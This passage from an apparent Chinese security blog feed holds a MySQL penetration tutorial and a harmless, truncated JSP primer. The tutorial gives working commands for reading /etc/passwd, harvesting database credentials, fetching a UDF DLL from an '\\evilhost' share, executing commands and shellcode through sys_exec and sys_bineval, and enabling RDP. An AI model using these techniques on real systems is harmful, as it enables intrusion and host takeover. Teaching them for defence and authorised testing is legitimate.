replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</code></pre><h3 id="4-查看哪些账号哪些主机能够连接"><a href="#4-查看哪些账号哪些主机能够连接" class="headerlink" title="4.查看哪些账号哪些主机能够连接"></a><strong>4.查看哪些账号哪些主机能够连接</strong></h3><p>前提是有 root 账号，能查询  mysql.user 表</p><pre><code class="hljs">select * from mysql.user;</code></pre><p>这其中有一个 host 字段能显示，该账号允许的登录地址，如果是 127.0.0.1 就是只允许本机登录，如果出现了 192.168.1.%,表明整个C段的主机使用该账号登录</p><h3 id="5-查看当前账号的权限"><a href="#5-查看当前账号的权限" class="headerlink" title="5.查看当前账号的权限"></a><strong>5.查看当前账号的权限</strong></h3><pre><code class="hljs">select * from mysql.user where user = substring_index(user(), &#39;@&#39;, 1) ;</code></pre><p>这个为什么我要拿出来说一下，虽然感觉和上面的是一样的，但是这里用到了  substrijng_index 这个函数，没有输入当前账号的名称，可能在某些情况能利用它绕过一些东西，于是就记录一下</p><h3 id="6-查看-Mysql-结构-和-操作系统的结构"><a href="#6-查看-Mysql-结构-和-操作系统的结构" class="headerlink" title="6.查看 Mysql 结构 和 操作系统的结构"></a><strong>6.查看 Mysql 结构 和 操作系统的结构</strong></h3><p>我们可以使用全局变量的方式查看这些信息</p><p>下面命令向我们展示了MySQL结构，操作系统的结构</p><pre><code class="hljs">mysql&gt; select @@version_compile_os,@@version_compile_machine;+----------------------+---------------------------+| @@version_compile_os | @@version_compile_machine |+----------------------+---------------------------+| Win32                | AMD64                     |+----------------------+---------------------------+1 row in set (0.00 sec)</code></pre><p>或者</p><pre><code class="hljs">mysql&gt; show variables like &#39;%compile%&#39;;\+-------------------------+-------+| Variable_name           | Value |+-------------------------+-------+| version_compile_machine | AMD64 || version_compile_os      | Win32 |+-------------------------+-------+2 rows in set (0.00 sec)</code></pre><h3 id="7-into-outfile-和-into-dunmpfile-的区别"><a href="#7-into-outfile-和-into-dunmpfile-的区别" class="headerlink" title="7.into outfile 和 into dunmpfile 的区别"></a><strong>7.into outfile 和 into dunmpfile 的区别</strong></h3><p>这两个操作在 渗透测试中的作用不可小觑，不要以为长得差不多，他们的功能是有侧重的</p><p>into outfile 主要的目的是导出 文本文件，我们在渗透过程中是用来写 shell 的<br>into dumpfile 的主要目的是导出二进制文件，在后面我们讲到 UDF 提权的过程中会经常用到这个函数生成我们的 udf.dll </p><h3 id="8-查看-MySQL-的安装路径"><a href="#8-查看-MySQL-的安装路径" class="headerlink" title="8.查看 MySQL 的安装路径"></a><strong>8.查看 MySQL 的安装路径</strong></h3><pre><code class="hljs">mysql&gt; select @@basedir;+-------------------------+| @@basedir               |+-------------------------+| E:\mysql-5.6.41-winx64\ |+-------------------------+1 row in set (0.00 sec)mysql&gt; show variables like &#39;%plugin%&#39;;+---------------+------------------------------------+| Variable_name | Value                              |+---------------+------------------------------------+| plugin_dir    | E:\mysql-5.6.41-winx64\lib\plugin\ |+---------------+------------------------------------+1 row in set (0.00 sec)</code></pre><h3 id="9-MYSQL-数据库user表"><a href="#9-MYSQL-数据库user表" class="headerlink" title="9.MYSQL 数据库user表"></a><strong>9.MYSQL 数据库user表</strong></h3><p>这个表里面藏着很多的好东西，和这个表有关的一共有三个文件即user.frm、user.MYD和 user.MYI，MYSQL数据库用户密码都保存在user.MYD文件中，包括root用户和其他用户的密码。在有权限的情况下，我们可以将User.frm、user.myd和User.myi三个文件下载到本地，通过本地的mysql环境直接读取user表中的数据。当然也可使用文本编辑器将user.MYD打开将root账号的密码复制出来到到cmd5.com进行查询和破解</p><h3 id="10-怎么找-Mysql-的账号密码"><a href="#10-怎么找-Mysql-的账号密码" class="headerlink" title="10.怎么找 Mysql 的账号密码"></a><strong>10.怎么找 Mysql 的账号密码</strong></h3><h4 id="方法一：翻配置文件"><a href="#方法一：翻配置文件" class="headerlink" title="方法一：翻配置文件"></a><strong>方法一：翻配置文件</strong></h4><p>我们知道，如果是网站的项目，就一定会有和数据库的链接配置文件，我们可以从这个文件中找到连接数据库的账号密码，如果控制的不好就是 root 权限，很有利于我们的提权</p><pre><code class="hljs">1.dedecms数据库安装的信息就是写在data/common.inc.php2.Discuz的数据库信息就在config/config_global_default.php、config /config_ucenter.php、config.inc.php3.对于java会在/WEB-INF/config/config.properties中配置</code></pre><p>一般数据库配置文件都会位于config、application、conn、db等目录，配置文件名称一般会是conn.asp&#x2F;php&#x2F;aspx&#x2F;jsp等。</p><h4 id="方法二：找历史记录"><a href="#方法二：找历史记录" class="headerlink" title="方法二：找历史记录"></a><strong>方法二：找历史记录</strong></h4><p>除了在文件中找以外，如果是 linux 系统，我们可以查看系统的历史命令，查看 .&#x2F;root&#x2F;.mysql_history、.&#x2F;root&#x2F;.bash_history文件找mysql操作涉及的密码</p><p>对于 低版本的 MYSQL（5.1） 一下的，对用户名和密码的传输是不加密的，我们可以找到 binary log 文件找密码 </p><h2 id="三、MYSQL-UDF-提权"><a href="#三、MYSQL-UDF-提权" class="headerlink" title="三、MYSQL UDF 提权"></a><strong>三、MYSQL UDF 提权</strong></h2><h3 id="1-什么是-UDF"><a href="#1-什么是-UDF" class="headerlink" title="1.什么是 UDF"></a><strong>1.什么是 UDF</strong></h3><p>那么什么是 UDF ？ 全称是 User defined function(用户自定义函数)，一听这个名字就知道我的基础权限要求还是很高的，要求数据库 root 权限<br>当我们有读取和写入权限以后，我们就可以尝试使用 udf 提权的方法，从数据库的 root 权限提升到 系统的管理员权限</p><h3 id="2-放在哪里"><a href="#2-放在哪里" class="headerlink" title="2.放在哪里"></a><strong>2.放在哪里</strong></h3><p>因为叫 UDF 于是我们能编写自己的 DLL 然后让 mysql 调用，实现我们自定义的命令</p><p>从MySQL 5.0.67开始，UDF库必须包含在plugin文件夹中，可以使用‘@@plugin_dir’全局变量找到它。这个变量可以在mysql.ini文件中看到和编辑。</p><pre><code class="hljs">mysql&gt; select @@plugin_dir;+-------------------------------------------+| @@plugin_dir                              |+-------------------------------------------+| E:\phpstudy\PHPTutorial\MySQL\lib\plugin\ |+-------------------------------------------+mysql&gt; show variables like &#39;plugin%&#39;;+---------------+-------------------------------------------+| Variable_name | Value                                     |+---------------+-------------------------------------------+| plugin_dir    | E:\phpstudy\PHPTutorial\MySQL\lib\plugin\ |+---------------+-------------------------------------------+1 row in set (0.00 sec)</code></pre><p>从MySQL 5.0.67开始，文件必须位于plugin目录中。该目录取决于plugin_dir系统变量的值。如果plugin_dir的值为空，则参照5.0.67之前即文件必须位于系统动态链接器的搜索目录中。</p><h3 id="3-怎么放进去"><a href="#3-怎么放进去" class="headerlink" title="3.怎么放进去"></a><strong>3.怎么放进去</strong></h3><h4 id="udf-dll-在哪"><a href="#udf-dll-在哪" class="headerlink" title="udf.dll 在哪"></a><strong>udf.dll 在哪</strong></h4><p>MSF 给我们提供了现成的 udf.dll ,位置在</p><pre><code class="hljs">/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.dll</code></pre><h4 id="方法一：远程加载"><a href="#方法一：远程加载" class="headerlink" title="方法一：远程加载"></a><strong>方法一：远程加载</strong></h4><p>load_file() 函数支持远程加载，然后我们配合 dumpfile  实现写入</p><pre><code class="hljs">select load_file(&#39;\\\\evilhost\evil.dll&#39;) into dumpfile &quot;E:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&quot; </code></pre><p>但是这里面有一个限制就是在lib 目录下一定要存在 plugin 目录，否则这个不能执行成功，会报一个错误，如下</p><pre><code class="hljs">#1 - Can&#39;t create/write to file &#39;E:\phpstudy\PHPTutorial\MySQL\lib\plugin\udf.dll&#39; (Errcode: 2)</code></pre><h4 id="方法二：HEX-写入"><a href="#方法二：HEX-写入" class="headerlink" title="方法二：HEX 写入"></a><strong>方法二：HEX 写入</strong></h4><p>在某些情况下我们可以将我们 udf.dll 转化成16进制然后写入，这样就不用连接外网了，我以64位的为例</p><pre><code class="hljs"> select hex(load_file(&#39;E:\\lib_mysqludf_sys_64.dll&#39;)) into outfile &quot;E:\\udf64.hex&quot;；</code></pre><p>生成了 hex 文件以后我们可以将 hex 文件的内容复制出来，写入我们的命令</p><pre><code class="hljs">select 0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000000… into dumpfile &quot;E:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&quot;;</code></pre><blockquote><p><strong>注意：</strong></p><p>我们导出的 hex 格式前面是没有 0x 的，这个需要自己添加</p></blockquote><h4 id="方法三：分段写入数据表中，然后-select-那个字段"><a href="#方法三：分段写入数据表中，然后-select-那个字段" class="headerlink" title="方法三：分段写入数据表中，然后 select 那个字段"></a><strong>方法三：分段写入数据表中，然后 select 那个字段</strong></h4><pre><code class="hljs">create table temp(data longblob);insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);select data from temp into dump file &quot;E:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&quot;;</code></pre><h4 id="方法四：利用函数-to-base64-和-from-base64"><a href="#方法四：利用函数-to-base64-和-from-base64" class="headerlink" title="方法四：利用函数 to_base64 和 from_base64"></a><strong>方法四：利用函数 to_base64 和 from_base64</strong></h4><p>从 MySQL 5.6.1 和 MariaDB 10.0.5 开始，我们就能使用 to_base64 和 from_base64 来进行编码了</p><pre><code class="hljs">select to_base64(load_file(&#39;E:\\lib_mysqludf_sys_64.dll&#39;)) into outfile &quot;E:\\udf64.b64&quot; </code></pre><p>然后我们使用 from_base64 解码并结合 into dumpfile 写入 dll</p><pre><code class="hljs">select from_base64(&quot;base64 的内容，因为太长了就不贴了&quot;) </code></pre><p>into dumpfile “E:\mysql-5.6.41-winx64\lib\plugin\udf64.dll”;</p><h3 id="4-怎么利用这个-dll"><a href="#4-怎么利用这个-dll" class="headerlink" title="4.怎么利用这个 dll"></a><strong>4.怎么利用这个 dll</strong></h3><p>我们要利用这个 dll 来安装我们写在 dll 中的函数，那我们需要看一下写这个 dll 的大佬给我们提供了哪些函数吧(于是翻出之前分析后门的工具，没想到还能在这里排上用场)</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/dll%E4%B8%AD%E5%85%A8%E9%83%A8%E7%9A%84%E5%87%BD%E6%95%B0.png" alt="此处输入图片的描述"></p><h4 id="1-sys-exec"><a href="#1-sys-exec" class="headerlink" title="1.sys_exec()"></a><strong>1.sys_exec()</strong></h4><p>当然是用频率最高的还是 sys_exec ,这个函数能让我们轻松地执行系统命令</p><p>让我们开始加载这函数吧</p><pre><code class="hljs">create function sys_exec RETURNS int soname &#39;udf.dll&#39; </code></pre><p>我们查看一下</p><pre><code class="hljs">mysql&gt; select * from mysql.func where name = &quot;sys_exec&quot;;+----------+-----+---------+----------+| name     | ret | dl      | type     |+----------+-----+---------+----------+| sys_exec |   2 | udf.dll | function |+----------+-----+---------+----------+1 row in set (0.00 sec)</code></pre><p>好了，我们能愉快的执行命令了</p><pre><code class="hljs">select sys_exec(&#39;whoami&#39;)</code></pre><p>运行结果：</p><pre><code class="hljs">mysql&gt; select sys_exec(&#39;whoami&#39;);+--------------------+| sys_exec(&#39;whoami&#39;) |+--------------------+|                  0 |+--------------------+1 row in set (0.28 sec)</code></pre><p>运行后你会快速看到命令执行的黑色框弹出，然后转瞬即逝，表明命令成功执行(<strong>要是能回显就好了~~~</strong>)</p><p>使用完了别忘了把函数删了</p><pre><code class="hljs">drop function sys_exec;</code></pre><p>这个时候再看</p><pre><code class="hljs">mysql&gt; select * from mysql.func where name = &quot;sys_exec&quot;;Empty set (0.00 sec)</code></pre><h4 id="2-sys-evel"><a href="#2-sys-evel" class="headerlink" title="2.sys_evel()"></a><strong>2.sys_evel()</strong></h4><p>该功能将执行系统命令并在屏幕上通过标准输出显示，什么？真的可以？梦想就要成真了，我们来试试</p><pre><code class="hljs">create function sys_eval returns string soname &#39;udf.dll&#39;;</code></pre><p>我们看一下：</p><pre><code class="hljs">mysql&gt; select * from mysql.func where name = &quot;sys_eval&quot;;+----------+-----+---------+----------+| name     | ret | dl      | type     |+----------+-----+---------+----------+| sys_eval |   0 | udf.dll | function |+----------+-----+---------+----------+1 row in set (0.00 sec)</code></pre><p>执行：</p><pre><code class="hljs">mysql&gt; select sys_eval(&#39;whoami&#39;);+------------------------+| sys_eval(&#39;whoami&#39;)     |+------------------------+| desktop-s2l4c24\k0rz3n |+------------------------+1 row in set (0.27 sec)</code></pre><p>太完美了！</p><p>删除函数：</p><pre><code class="hljs">drop function sys_eval;</code></pre><h4 id="3-sys-get"><a href="#3-sys-get" class="headerlink" title="3.sys_get()"></a><strong>3.sys_get()</strong></h4><p>该函数返回系统变量的值</p><p>注册函数</p><pre><code class="hljs">create function sys_get returns string soname &#39;udf.dll&#39;;</code></pre><p>查看：</p><pre><code class="hljs">mysql&gt; select * from mysql.func where name = &quot;sys_get&quot;;+---------+-----+---------+----------+| name    | ret | dl      | type     |+---------+-----+---------+----------+| sys_get |   0 | udf.dll | function |+---------+-----+---------+----------+1 row in set (0.00 sec)</code></pre><p>使用：</p><pre><code class="hljs">select sys_get(&#39;longonserver&#39;);</code></pre><p>结果：</p><pre><code class="hljs">mysql&gt; Select sys_get(&#39;COMSPEC&#39;);+-----------------------------+| sys_get(&#39;COMSPEC&#39;)          |+-----------------------------+| C:\Windows\system32\cmd.exe |+-----------------------------+1 row in set (0.00 sec)</code></pre><p>删除：</p><pre><code class="hljs">drop function sys_get;</code></pre><h4 id="4-执行Shellcode-sys-bineval"><a href="#4-执行Shellcode-sys-bineval" class="headerlink" title="4.执行Shellcode - sys_bineval"></a><strong>4.执行Shellcode - sys_bineval</strong></h4><p>这个函数应该功能更强大，能直接执行 shellcode&#x2F;任何二进制文件 ,我们把 shellcode&#x2F; 任意二进制文件 编码为 hex 或者 base64 ，然后在解码一下传递给他就行了</p><p>注册函数：</p><pre><code class="hljs">create function sys_bineval returns int soname &#39;udf.dll&#39;;</code></pre><p>查看一下：</p><pre><code class="hljs">mysql&gt; select * from mysql.func where name = &quot;sys_bineval&quot;;+-------------+-----+---------+----------+| name        | ret | dl      | type     |+-------------+-----+---------+----------+| sys_bineval |   2 | udf.dll | function |+-------------+-----+---------+----------+1 row in set (0.00 sec)</code></pre><p>我们先把我们要运行的二进制文件编码成 base64 形式</p><pre><code class="hljs">select to_base64(load_file(&#39;E:\\calc.exe&#39;)) into outfile &quot;E:\\calc.b64&quot; </code></pre><p>使用：</p><pre><code class="hljs">select sys_bineval(from_base64(load_file(&#39;E:\\calc.b64&#39;)));</code></pre><p>但是这个方法有些不稳定，我第一次尝试的时候 mysql 直接挂了，开都开不起来了,hhh，原作者也说了这个方法似乎不适用于 64位平台，但是在 32 位平台能正常工作</p><p>删除函数</p><pre><code class="hljs">drop function sys_bineval;</code></pre><h4 id="5-补充一些-trick"><a href="#5-补充一些-trick" class="headerlink" title="5.补充一些 trick"></a><strong>5.补充一些 trick</strong></h4><h5 id="1-导出文件名的问题"><a href="#1-导出文件名的问题" class="headerlink" title="1.导出文件名的问题"></a><strong>1.导出文件名的问题</strong></h5><p>导出的文件名不一定要是 xxx.dll ，我们可以任意命名，这个后缀名对创建函数没有任何影响</p><pre><code class="hljs">mysql&gt;  create function sys_exec returns string soname &#39;udf.exp&#39;;Query OK, 0 rows affected (0.01 sec)</code></pre><h5 id="2-不存在plugin-目录的问题"><a href="#2-不存在plugin-目录的问题" class="headerlink" title="2.不存在plugin 目录的问题"></a><strong>2.不存在plugin 目录的问题</strong></h5><p>这个问题相当的棘手啊，mysql 5.1 以后我们必须将我们的 udf.dll 弄到我们的亲爱的 pplugin 目录下，但是要是偏偏没有这个目录怎么办？</p><p>kingcope提到了一种方法，利用NTFS ADS流来创建文件夹的方法，这个方法我们经常称之为 NTFS 隐写，可以用来写后门甚至 getshell</p><h6 id="1-什么是-NTFS-的-ADS"><a href="#1-什么是-NTFS-的-ADS" class="headerlink" title="1.什么是 NTFS  的 ADS"></a><strong>1.什么是 NTFS  的 ADS</strong></h6><p>在NTFS文件系统中存在着NTFS交换数据流（Alternate Data Streams，简称ADS），这是NTFS磁盘格式的特性之一。每一个文件，都有着主文件流和非主文件流，主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是NTFS交换数据流,正因为这个特性，通常 ADS也被用于一些恶意文件隐藏自身,作为后门。</p><p>为了避免跑题，我这里就不讲解 NTFS ADS 的其他用途，我们就来看一下怎么创建文件夹</p><h6 id="2-怎么在只能导出文件的情况下导出一个文件夹"><a href="#2-怎么在只能导出文件的情况下导出一个文件夹" class="headerlink" title="2.怎么在只能导出文件的情况下导出一个文件夹"></a><strong>2.怎么在只能导出文件的情况下导出一个文件夹</strong></h6><p>我们创建一个空的名为 TEST 的文件夹</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%A9%BA%E6%96%87%E4%BB%B6%E5%A4%B9.png" alt="此处输入图片的描述"></p><p>然后我们执行下面这条命令</p><pre><code class="hljs">echo xxx &gt; test::$INDEX_ALLOCATION</code></pre><p><strong>结果如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%88%90%E5%8A%9F%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9.png" alt="此处输入图片的描述"></p><p>我们清楚地看到本来是创建文件的命令在 ::$INDEX_ALLOCATION 的作用下创建成了一个文件夹（这个应该是一个漏洞，微软在最近的漏洞补丁中生成要修复这个漏洞，并且有了CVE 编号 CVE-2018-1036&#x2F;NTFS EOP，不过我目前本地测试应该没有收到影响）</p><h6 id="2-试一下使用-mysql-导出文件的方法能不能成功"><a href="#2-试一下使用-mysql-导出文件的方法能不能成功" class="headerlink" title="2.试一下使用 mysql 导出文件的方法能不能成功"></a><strong>2.试一下使用 mysql 导出文件的方法能不能成功</strong></h6><p>首先看一下我本地的 xxx&#x2F;mysql&#x2F;lib&#x2F; 下面没有 plugin 文件夹</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/mysql%E4%B8%8B%E6%B2%A1%E6%9C%89%E6%96%87%E4%BB%B6%E5%A4%B9.png" alt="此处输入图片的描述"></p><p>执行文件导出命令：</p><pre><code class="hljs">select &#39;xxx&#39; into outfile &#39;E:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&#39;;</code></pre><p>结果：</p><pre><code class="hljs">#1 - Can&#39;t create/write to file &#39;E:\phpstudy\PHPTutorial\MySQL\lib\plugin::$INDEX_ALLOCATION&#39; (Errcode: 13 - Permission denied)</code></pre><p>失败了。。。。，心情复杂，具体原因我也不是很清楚，因为我创建普通文件的时候是可以的，如果有师傅尝试成功还望不吝赐教</p><h5 id="3-能执行命令以后我们能做更多"><a href="#3-能执行命令以后我们能做更多" class="headerlink" title="3.能执行命令以后我们能做更多"></a><strong>3.能执行命令以后我们能做更多</strong></h5><h6 id="1-先看一下-3389-开没开："><a href="#1-先看一下-3389-开没开：" class="headerlink" title="(1)先看一下 3389 开没开："></a><strong>(1)先看一下 3389 开没开：</strong></h6><pre><code class="hljs">netstat -an |find &quot;3389&quot; </code></pre><p>######<strong>(2)Windows 2008Server命令行开启3389</strong></p><pre><code class="hljs">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1 wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1 reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/zydj333/p/6951002.html">https://www.cnblogs.com/zydj333/p/6951002.html</a><br><a href="http://blog.51cto.com/simeon/1926022">http://blog.51cto.com/simeon/1926022</a><br><a href="http://www.mottoin.com/article/web/96772.html">http://www.mottoin.com/article/web/96772.html</a><br><a href="https://blog.csdn.net/m0_37438418/article/details/80289025?utm_source=blogxgwz7">https://blog.csdn.net/m0_37438418/article/details/80289025?utm_source=blogxgwz7</a><br><a href="https://xz.aliyun.com/t/2167?accounttraceid=85dbd2c9-8021-4125-bf50-c7be4b510695">https://xz.aliyun.com/t/2167?accounttraceid=85dbd2c9-8021-4125-bf50-c7be4b510695</a><br><a href="http://www.freebuf.com/articles/system/163144.html">http://www.freebuf.com/articles/system/163144.html</a><br><a href="http://www.freebuf.com/articles/3853.html">http://www.freebuf.com/articles/3853.html</a><br><a href="https://www.i0day.com/733.html">https://www.i0day.com/733.html</a><br><a href="https://xz.aliyun.com/t/2167?accounttraceid=85dbd2c9-8021-4125-bf50-c7be4b510695">https://xz.aliyun.com/t/2167?accounttraceid=85dbd2c9-8021-4125-bf50-c7be4b510695</a><br><a href="https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html">https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html</a><br><a href="https://www.jianshu.com/p/bd18b92c1224">https://www.jianshu.com/p/bd18b92c1224</a><br><a href="https://www.i0day.com/733.html">https://www.i0day.com/733.html</a><br><a href="https://www.freebuf.com/column/143125.html">https://www.freebuf.com/column/143125.html</a><br><a href="https://www.cnblogs.com/qing123/p/6608141.html">https://www.cnblogs.com/qing123/p/6608141.html</a><br><a href="https://www.cnblogs.com/qing123/p/6771858.html">https://www.cnblogs.com/qing123/p/6771858.html</a></p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全 MySQL 渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>J2EE基础（JSP 篇）</title>
    <link href="/2018/10/13/J2EE%E5%9F%BA%E7%A1%80%EF%BC%88JSP%20%E7%AF%87%EF%BC%89/"/>
    <url>/2018/10/13/J2EE%E5%9F%BA%E7%A1%80%EF%BC%88JSP%20%E7%AF%87%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="一、为什么会出现-jsp（java-server-page）"><a href="#一、为什么会出现-jsp（java-server-page）" class="headerlink" title="一、为什么会出现 jsp（java server page）"></a><strong>一、为什么会出现 jsp（java server page）</strong></h2><p>1.程序员在开发过程中发现 servlet 开发界面非常的不方便，于是诞生了 jsp </p><p>2.一个公式：</p><pre><code class="hljs">jsp = html + java + jsp 标签 + js + css</code></pre><p>3.jsp + java类（service Javabean）+ servlet 就会构成 mvc 开发模式</p><p>4.jsp  是运行在服务器端的</p><p><strong>网络拓扑：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/jsp%20%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91.png" alt="此处输入图片的描述"></p><p>5.jsp 的基础是 servlet （相当于是对 servlet 的包装）</p><span id="more"></span><h2 id="二、第一个jsp-程序"><a href="#二、第一个jsp-程序" class="headerlink" title="二、第一个jsp 程序"></a><strong>二、第一个jsp 程序</strong></h2><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Showtime&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;%    out.println(&quot;hello,world&quot;);%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="三、服务器如何处理-jsp"><a href="#三、服务器如何处理-jsp" class="headerlink" title="三、服务器如何处理 jsp"></a><strong>三、服务器如何处理 jsp</strong></h2><h3 id="1-那么服务器接收到对jsp-文件的请求以后是怎么处理的呢"><a href="#1-那么服务器接收到对jsp-文件的请求以后是怎么处理的呢" class="headerlink" title="1.那么服务器接收到对jsp 文件的请求以后是怎么处理的呢?"></a><strong>1.那么服务器接收到对jsp 文件的请求以后是怎么处理的呢?</strong></h3><p>如果是第一次访问该jsp 文件 web 服务器收到请求以后，会先将这个 jsp 文件翻译成一个 servlet文件，然后在将其编译成 class 文件，然后再把 class 文件加载到内存，但是如果是第二次以后就是直接访问内存中的class 文件了，所以 jsp 是单例(当然，如果某个 jsp 文件被修改了再访问就相当于是第一次)</p><h3 id="2-jsp-页面的报错实际上会转化成-servlet-的报错"><a href="#2-jsp-页面的报错实际上会转化成-servlet-的报错" class="headerlink" title="2. jsp 页面的报错实际上会转化成 servlet 的报错"></a><strong>2. jsp 页面的报错实际上会转化成 servlet 的报错</strong></h3><p>因此，我们调试的时候，需要找到那个他转化好的servlet 文件才能方便的进行错误定位</p><h3 id="3-为什么我们在-jsp-中能直接使用-out"><a href="#3-为什么我们在-jsp-中能直接使用-out" class="headerlink" title="3.为什么我们在 jsp 中能直接使用 out"></a><strong>3.为什么我们在 jsp 中能直接使用 out</strong></h3><p>因为 out 是 jsp 的一个内置对象，也就是说，虽然在 jsp 页面没有定义，但是在当 jsp 转化成了 servlet 的时候，在 servlet 中给我们默认定义好了</p><h3 id="4-同一个页面的java-片段中的变量可以互相使用"><a href="#4-同一个页面的java-片段中的变量可以互相使用" class="headerlink" title="4.同一个页面的java 片段中的变量可以互相使用"></a><strong>4.同一个页面的java 片段中的变量可以互相使用</strong></h3><p><strong>示例代码:</strong></p><pre><code class="hljs">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Showtime&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;%    out.println(&quot;hello,world&quot;);%&gt;&lt;%    int i = 99;    int j = i+1;%&gt;&lt;%    out.println(&quot;j = &quot; +j);%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">j = 100 </code></pre><p><strong>为什么呢？</strong></p><p>要找到原因我们还是要看一下 servlet 文件</p><p><strong>示例代码：</strong></p><pre><code class="hljs">package org.apache.jsp;import javax.servlet.*;import javax.servlet.http.*;import javax.servlet.jsp.*;public final class showtime_jsp extends org.apache.jasper.runtime.HttpJspBase    implements org.apache.jasper.runtime.JspSourceDependent &#123;  private static final javax.servlet.jsp.JspFactory _jspxFactory =          javax.servlet.jsp.JspFactory.getDefaultFactory();  private static java.util.Map&lt;java.lang.String,java.lang.Long&gt; _jspx_dependants;  private volatile javax.el.ExpressionFactory _el_expressionfactory;  private volatile org.apache.tomcat.InstanceManager _jsp_instancemanager;  public java.util.Map&lt;java.lang.String,java.lang.Long&gt; getDependants() &#123;    return _jspx_dependants;  &#125;  public javax.el.ExpressionFactory _jsp_getExpressionFactory() &#123;    if (_el_expressionfactory == null) &#123;      synchronized (this) &#123;        if (_el_expressionfactory == null) &#123;          _el_expressionfactory = _jspxFactory.getJspApplicationContext(getServletConfig().getServletContext()).getExpressionFactory();        &#125;      &#125;    &#125;    return _el_expressionfactory;  &#125;  public org.apache.tomcat.InstanceManager _jsp_getInstanceManager() &#123;    if (_jsp_instancemanager == null) &#123;      synchronized (this) &#123;        if (_jsp_instancemanager == null) &#123;          _jsp_instancemanager = org.apache.jasper.runtime.InstanceManagerFactory.getInstanceManager(getServletConfig());        &#125;      &#125;    &#125;    return _jsp_instancemanager;  &#125;  public void _jspInit() &#123;  &#125;  public void _jspDestroy() &#123;  &#125;  public void _jspService(final javax.servlet.http.HttpServletRequest request, final javax.servlet.http.HttpServletResponse response)        throws java.io.IOException, javax.servlet.ServletException &#123;    final javax.servlet.jsp.PageContext pageContext;    javax.servlet.http.HttpSession session = null;    final javax.servlet.ServletContext application;    final javax.servlet.ServletConfig config;    javax.servlet.jsp.JspWriter out = null;    final java.lang.Object page = this;    javax.servlet.jsp.JspWriter _jspx_out = null;    javax.servlet.jsp.PageContext _jspx_page_context = null;    try &#123;      response.setContentType(&quot;text/html;charset=UTF-8&quot;);      pageContext = _jspxFactory.getPageContext(this, request, response,      null, true, 8192, true);      _jspx_page_context = pageContext;      application = pageContext.getServletContext();      config = pageContext.getServletConfig();      session = pageContext.getSession();      out = pageContext.getOut();      _jspx_out = out;      out.write(&quot;\r\n&quot;);      out.write(&quot;&lt;html&gt;\r\n&quot;);      out.write(&quot;&lt;head&gt;\r\n&quot;);      out.write(&quot;    &lt;title&gt;Showtime&lt;/title&gt;\r\n&quot;);      out.write(&quot;&lt;/head&gt;\r\n&quot;);      out.write(&quot;&lt;body&gt;\r\n&quot;);    out.println(&quot;hello,world&quot;);      out.write(&quot;\r\n&quot;);      out.write(&quot;\r\n&quot;);    int i = 99;                          //注意这里    int j = i+1;      out.write(&quot;\r\n&quot;);      out.write(&quot;\r\n&quot;);      out.write(&quot;\r\n&quot;);    out.println(&quot;j = &quot; +j);             //还有这里       out.write(&quot;\r\n&quot;);      out.write(&quot;&lt;/body&gt;\r\n&quot;);      out.write(&quot;&lt;/html&gt;\r\n&quot;);    &#125; catch (java.lang.Throwable t) &#123;      if (!(t instanceof javax.servlet.jsp.SkipPageException))&#123;        out = _jspx_out;        if (out != null &amp;&amp; out.getBufferSize() != 0)          try &#123;            if (response.isCommitted()) &#123;              out.flush();            &#125; else &#123;              out.clearBuffer();            &#125;          &#125; catch (java.io.IOException e) &#123;&#125;        if 